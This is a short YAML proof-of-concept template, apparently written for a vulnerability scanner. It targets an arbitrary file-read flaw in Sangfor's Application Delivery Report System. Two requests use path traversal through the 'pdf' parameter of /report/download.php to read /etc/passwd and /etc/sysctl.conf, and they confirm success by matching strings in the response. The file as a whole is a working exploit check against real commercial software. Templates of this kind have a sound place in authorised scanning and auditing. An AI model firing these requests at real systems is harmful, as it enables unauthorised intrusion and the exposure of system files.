id: poc-yaml-sangfor-app-delivery-reports-system-file-read
info:
  name: 深信服应用交付报表系统任意文件读取漏洞
  severity: high
  tags:
  - 两高一弱
  - 文件读取
  finger: 应用交付报表系统
requests:
- method: GET
  path: /report/download.php?pdf=../../../../../etc/passwd
  expression: status_code == 200 && contains(body,"/bin/bash") && contains(body,"/sbin/nologin")
- method: GET
  path: /report/download.php?pdf=../../../../../etc/sysctl.conf
  expression: status_code == 200 && contains(body,"# Kernel sysctl configuration file
    for Red Hat Linux")
variables: {}
transport: http
